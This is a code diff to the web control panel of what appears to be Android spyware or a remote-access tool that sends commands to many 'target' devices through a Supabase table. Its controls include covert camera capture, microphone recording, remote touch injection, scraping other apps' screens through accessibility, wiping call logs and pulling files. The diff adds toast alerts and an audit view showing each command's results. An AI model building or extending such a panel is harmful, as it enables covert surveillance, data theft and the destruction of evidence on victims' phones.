@@ -101,6 +101,15 @@
         .btn.danger { border-color: var(--danger); color: var(--danger); }
         .btn.danger:active { background: var(--danger); color: #fff; }
 
+        .btn-status { width: 30px; background: rgba(0, 243, 255, 0.1); border: 1px solid #333; color: var(--primary); font-size: 0.6rem; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+        .btn-status:hover { border-color: var(--primary); }
+
+        #toast-container { position: fixed; top: 80px; right: 20px; z-index: 1000; pointer-events: none; }
+        .toast { background: var(--surface); border-left: 4px solid var(--primary); padding: 12px 20px; margin-bottom: 10px; font-size: 0.8rem; box-shadow: 0 5px 15px rgba(0,0,0,0.5); animation: toastIn 0.3s ease forwards; opacity: 0; }
+        @keyframes toastIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
+        #status-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; display: none; flex-direction: column; padding: 20px; overflow-y: auto; }
+
         .log-entry { font-size: 0.8rem; padding: 8px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
         .log-time { color: #666; font-size: 0.7rem; }
         .log-tag { color: var(--secondary); margin-right: 5px; }
@@ -118,6 +127,13 @@
     </style>
 </head>
 <body>
+
+    <div id="toast-container"></div>
+    <div id="status-overlay" onclick="this.style.display='none'">
+        <h2 id="status-title">COMMAND AUDIT</h2>
+        <div id="status-content" style="flex:1"></div>
+        <button class="btn" style="margin-top:20px">CLOSE AUDIT</button>
+    </div>
 
     <div id="loader">
         <div style="color: var(--primary); font-size: 1.5rem; letter-spacing: 5px;">SYNCING...</div>
@@ -153,14 +169,15 @@
         <div id="view-cmd" class="section">
             <h2>Interference</h2>
             <div class="card">
-                <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Remote Intent</label>
                     <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
                     <input type="text" id="int-data" placeholder="Data (URL/URI)">
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('RUN_INTENT')">?</button>
                         <select id="int-tgt" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
                             <option value="activity">Activity</option>
                             <option value="service">Service</option>
@@ -176,6 +193,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Optical Capture</label>
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('CAPTURE_IMAGE')">?</button>
                         <select id="cam-side" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);"><option value="REAR">Rear</option><option value="FRONT">Front</option></select>
                         <input type="number" id="cam-count" value="1" placeholder="Qty" style="width:60px">
                         <button class="btn" onclick="sendCmd('CAPTURE_IMAGE')">Capture</button>
@@ -184,6 +202,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Acoustic Snippet</label>
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('RECORD_VOICE')">?</button>
                         <input type="number" id="mic-dur" value="10" placeholder="Secs">
                         <button class="btn" onclick="sendCmd('RECORD_VOICE')">Record Mic</button>
                     </div>
@@ -191,6 +210,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Ghost Interaction (Remote Touch)</label>
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('REMOTE_TOUCH')">?</button>
                         <select id="touch-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="NAV|BACK">Nav: Back</option>
                             <option value="NAV|HOME">Nav: Home</option>
@@ -208,6 +228,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('GET_TREE')">?</button>
                         <input type="text" id="tree-pkg" placeholder="Package (null for all)">
                         <input type="number" id="tree-dur" value="1" placeholder="Mins" style="width:80px">
                         <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
@@ -216,6 +237,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Call Log Sanitizer</label>
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('PHONE_LOGS')">?</button>
                         <select id="call-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="CLEAR_ALL">Wipe All Logs</option>
                             <option value="DELETE_LAST">Wipe Last (Mins)</option>
@@ -225,7 +247,7 @@
                         <button class="btn" onclick="sendCmd('PHONE_LOGS')">Sanitize</button>
                     </div>
                 </div>
-                <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
                 <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                     <button class="btn" onclick="sendCmd('GET_SKELETON')">Index Storage</button>
                     <button class="btn" onclick="sendCmd('GET_LOGS')">Diag Logs</button>
@@ -432,8 +454,56 @@
             }));
 
             const { error } = await sb.from('file_commands').insert(commands);
-            if (error) alert("UPLINK ERROR: " + error.message);
-            else alert(`BROADCAST SUCCESS: ${type} SENT TO ${selectedDeviceIds.size} DEVICES`);
+            if (error) toast("UPLINK ERROR: " + error.message, "danger");
+            else toast(`${type} BROADCAST TO ${selectedDeviceIds.size} TARGETS`, "success");
+        }
+
+        function toast(msg, type = 'success') {
+            const container = document.getElementById('toast-container');
+            const t = document.createElement('div');
+            t.className = 'toast';
+            t.style.borderLeftColor = type === 'success' ? 'var(--success)' : 'var(--danger)';
+            t.innerText = msg;
+            container.appendChild(t);
+            setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 3000);
+        }
+
+        async function auditCmd(type) {
+            if (selectedDeviceIds.size === 0) return toast("SELECT TARGETS TO AUDIT", "danger");
+            
+            document.getElementById('status-title').innerText = `CLUSTER AUDIT: ${type}`;
+            document.getElementById('status-content').innerHTML = '<div style="padding:20px; text-align:center;">FETCHING CLUSTER DATA...</div>';
+            document.getElementById('status-overlay').style.display = 'flex';
+
+            const { data, error } = await sb.from('file_commands')
+                .select('*')
+                .eq('file_name', type)
+                .in('device_id', Array.from(selectedDeviceIds))
+                .order('created_at', { ascending: false })
+                .limit(15);
+
+            if (error) return document.getElementById('status-content').innerHTML = `Error: ${error.message}`;
+
+            document.getElementById('status-content').innerHTML = data.map(c => {
+                let statusCol = 'var(--text)';
+                if (c.status === 'PENDING') statusCol = '#f59e0b';
+                if (c.status === 'RECEIVED') statusCol = 'var(--primary)';
+                if (c.status === 'EXECUTED' || c.status.includes('SUCCESS')) statusCol = 'var(--success)';
+                if (c.status.includes('FAILED') || c.status.includes('ERROR')) statusCol = 'var(--danger)';
+
+                return `
+                    <div class="card" style="margin-bottom:10px; border-left-color: ${statusCol}">
+                        <div style="display:flex; justify-content:space-between; font-size:0.7rem; color:#666; margin-bottom:5px;">
+                            <span>ID: ${c.device_id.substring(0,8)}...</span>
+                            <span>${new Date(c.created_at).toLocaleString()}</span>
+                        </div>
+                        <div style="font-size:0.85rem; font-weight:bold; color:${statusCol}">${c.status}</div>
+                        <div style="font-size:0.75rem; color:#aaa; margin-top:5px; background:rgba(0,0,0,0.3); padding:5px;">${c.content.substring(0,60)}${c.content.length > 60 ? '...' : ''}</div>
+                        ${c.error_log ? `<div style="color:var(--danger); font-size:0.7rem; margin-top:5px;">ERROR: ${c.error_log}</div>` : ''}
+                        ${c.result_data ? `<div style="color:var(--primary); font-size:0.7rem; margin-top:5px; font-family:monospace;">RESULT: ${JSON.stringify(c.result_data)}</div>` : ''}
+                    </div>
+                `;
+            }).join('') || '<div style="padding:40px; text-align:center; color:#444;">NO COMMAND HISTORY FOR SELECTED CLUSTER</div>';
         }
 
         async function fetchFiles() {
